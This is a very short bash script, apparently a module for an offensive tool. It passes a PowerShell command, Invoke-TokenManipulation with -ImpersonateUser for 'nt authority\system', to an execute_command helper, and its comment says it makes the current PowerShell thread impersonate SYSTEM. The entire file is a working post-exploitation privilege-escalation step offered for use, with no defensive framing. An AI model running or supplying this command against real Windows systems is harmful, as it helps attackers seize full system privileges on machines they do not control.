#!/bin/bash

: '
ps: Makes the current PowerShell thread impersonate SYSTEM.
'

execute_command "Invoke-TokenManipulation -ImpersonateUser -Username \"nt authority\system\""
create_new_line
